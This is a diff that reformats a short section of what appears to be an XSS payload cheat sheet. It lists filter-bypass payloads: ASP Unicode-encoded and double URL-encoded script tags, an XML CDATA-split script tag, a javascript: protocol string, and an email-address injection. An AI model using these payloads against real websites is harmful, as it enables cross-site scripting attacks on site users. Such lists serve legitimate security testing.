@@ -1,10 +1,18 @@
-```%u003Cscript%u003Eprompt%u0028303%u0029%u003C/script%u003E```  Older ASP encoding filter bypass
+ASP filter bypass
 
-```%253Cscript%253Ealert(1)%253C%252Fscript%253E``` Older ASP encoding filter bypass
+```%u003Cscript%u003Eprompt%u0028303%u0029%u003C/script%u003E```
 
-```<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>``` XML Reflection XSS
+Double URL encoding
 
-```javascript://%250aalert(1)```  Where :// is required after protocol
+```%253Cscript%253Ealert(1)%253C%252Fscript%253E```
+
+XSS in XML
+
+```<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>```
+
+ Where :// is required after protocol
+
+```javascript://%250aalert(1)```
 
 ```"\"><s>test"@gmail.com```  XSS in email addresses
   
